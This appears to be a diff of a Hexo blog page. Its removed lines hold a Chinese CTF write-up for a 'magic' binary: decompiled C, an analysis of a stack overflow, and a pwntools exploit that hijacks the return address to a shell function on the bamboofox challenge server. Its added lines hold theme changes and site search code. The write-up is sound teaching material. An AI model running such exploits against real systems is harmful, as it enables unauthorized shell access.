-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  magic ./magic </span><br><span class="line">Welcome to Magic system!</span><br><span class="line">Give me your name(a-z): aaaa</span><br><span class="line">Your name is aaaa.</span><br><span class="line">Give me something that you want to MAGIC: 1111111111111111</span><br><span class="line">�'��m��:�ǵ�j#</span><br></pre></td></tr></table></figure>
-<p>IDA反编译结果如下：</p>
-<ul>
-<li><p>main</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    _BYTE v4[<span class="number">3</span>]; <span class="comment">// [esp+11h] [ebp-Fh]</span></span><br><span class="line">    <span class="keyword">int</span> i; <span class="comment">// [esp+1Ch] [ebp-4h]</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Welcome to Magic system!"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Give me your name(a-z): "</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">10</span> &amp;&amp; read(<span class="number">0</span>, &amp;v4[i], <span class="number">1u</span>) &amp;&amp; v4[i] &gt; <span class="number">96</span> &amp;&amp; v4[i] ; ++i )</span><br><span class="line">      ;</span><br><span class="line">    v4[i] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Your name is %s.\n"</span>, v4);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Give me something that you want to MAGIC: "</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    magic();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>never_use</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">never_use</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> system(<span class="string">"sh -i"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>根据代码可以得出，magic的scanf()处存在栈溢出漏洞，而程序中有一个写好了的never_use()可以调用shell，因此思路在于利用栈溢出劫持eip到never_use()处。<br>为了具体实现，需要事先记下never_use()的地址。在IDA中查看：</p>
-<p><img src="https://i.loli.net/2019/02/18/5c6a8a2a8ab42.png" alt="Please wait while loading image." title="addr"></p>
-<p>这里应该是出题人留了个坑，scanf()在读取\x0D的时候会“吃掉”它，因此这里需要修改目标地址为0x08048613，<br>    target_addr = 0x08048613<br>有了目标地址，再回头来看利用。根据IDA中给出的大小</p>
-<p><img src="https://i.loli.net/2019/02/18/5c6a8eb2c93ba.png" alt="Please wait while loading image." title="stack"></p>
-<p>观察s，距离ebp是44h，即68，加上ebp自身的4字节大小，最后得出payload的格式应该为”[72]+target_addr”，而这里出题人还留了个坑，就是do_magic()，这个函数会在magic()返回之前，将用户的输入与随机数做异或运算，这样原本输入的目标地址会被打乱。为了解决这个问题，需要在payload的地址前插入一个\x00，\x00会使strlen()返回，因此在72个随机字符中只要插入一个\x00，后面的部分就不会被do_magic()改变，目标地址也就保存下来了，最终exp如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">target_addr = <span class="number">0x08048613</span></span><br><span class="line">payload = <span class="string">"a"</span> * <span class="number">71</span> + <span class="string">'\x00'</span> + p32(target_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'The payload is :'</span> + payload</span><br><span class="line"><span class="comment">#sh = process('./magic')</span></span><br><span class="line">sh = remote(<span class="string">'bamboofox.cs.nctu.edu.tw'</span>, <span class="number">10000</span>)</span><br><span class="line"><span class="keyword">print</span> sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">sh.sendline(<span class="string">'a'</span>)</span><br><span class="line"><span class="keyword">print</span> sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-<p><code>`</code></p>
+          寒假任务提交
+因为之前已经有一定基础，所以假期的学习重点放在了补充基础知识上，顺便针对性地做了几道有代表性的题，每道题的知识点是很单一的栈溢出/格式化字符串/堆溢出，但是也不算简单到秒杀级别，因为会夹杂一些坑，并且出题人挖的坑一个不剩的全踩到了……
 
-          
+一、基础知识
+这部分主要是放一些基础的做题前置知
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/04/22/寒假任务笔记/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1217,7 +1180,7 @@
 
 
 
-  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
 
 
 
@@ -1264,6 +1227,8 @@
   
 
 
+  
+
 
 
 
@@ -1304,6 +1269,11 @@
     <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
   
 
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
 
   
 
@@ -1316,6 +1286,13 @@
 
   
   
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
 
   
 
@@ -1360,6 +1337,323 @@
 
 
   
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
 
 
 
